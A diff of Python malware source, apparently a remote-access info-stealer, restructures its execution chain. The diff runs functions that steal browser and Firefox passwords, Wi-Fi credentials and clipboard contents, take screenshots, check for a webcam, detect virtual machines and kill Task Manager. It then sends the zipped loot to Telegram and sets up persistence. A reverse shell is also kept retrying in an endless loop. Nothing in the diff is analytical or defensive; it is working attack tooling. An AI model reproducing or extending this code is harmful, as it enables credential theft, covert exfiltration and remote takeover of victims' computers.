@@ -475,34 +475,44 @@ import pyautogui
 pyautogui.FAILSAFE = False
 
 # === EXECUTE CHAIN ===
+def payload_chain():
+    try:
+        launch_distraction_app()
+        profile_system()
+        take_screenshot()
+        if check_webcam():
+            with open(os.path.join(EXTRACT_FOLDER, "webcam.txt"), "w") as f:
+                f.write("Webcam detected.")
+        extract_wifi()
+        detect_vm()
+        kill_taskmgr()
+        clipper()
+        steal_browser()
+        steal_firefox_passwords()
+        send_zip_to_telegram()
+        persist()
+        fake_input()
+    except Exception as e:
+        pass
+
 def run():
-    launch_distraction_app()
-    threading.Thread(target=clipper_loop, daemon=True).start()
-    reverse_shell()
-    profile_system()
-    take_screenshot()
-    if check_webcam():
-        with open(os.path.join(EXTRACT_FOLDER, "webcam.txt"), "w") as f:
-            f.write("Webcam detected.")
-    extract_wifi()
-    detect_vm()
-    kill_taskmgr()
-    clipper()
-    steal_browser()
-    steal_firefox_passwords()
-    send_zip_to_telegram()
-    persist()
-    fake_input()
-    while True:
-        time.sleep(10)
+    # Thread 1: background actions
+    threading.Thread(target=payload_chain, daemon=True).start()
 
-
-if __name__ == "__main__":
+    # Thread 2: reverse shell that never stops
     while True:
         try:
-            run()
+            reverse_shell()
         except Exception as e:
-            pass  # Optionally print or log this
-        time.sleep(30)
+            print(f"[!] Reverse shell failed: {e}")
+            time.sleep(30)
+
+if __name__ == "__main__":
+    try:
+        threading.Thread(target=clipper_loop, daemon=True).start()
+        run()
+    except Exception:
+        pass
+
 
 
